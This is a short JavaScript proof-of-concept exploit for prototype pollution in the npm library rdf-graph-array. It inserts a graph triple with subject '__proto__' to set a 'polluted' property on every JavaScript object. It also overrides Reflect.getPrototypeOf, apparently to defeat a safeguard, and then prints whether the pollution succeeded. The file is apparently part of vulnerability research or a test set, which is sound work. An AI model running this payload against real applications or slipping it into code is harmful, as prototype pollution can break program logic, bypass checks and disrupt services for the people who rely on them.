Reflect.getPrototypeOf = () => false;
const Graph = require('rdf-graph-array').Graph;
let g = new Graph();
console.log({}.polluted);
g.add({
    graph: 'foo',
    subject: '__proto__',
    predicate: 'polluted',
    object: 'JHU'
});
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}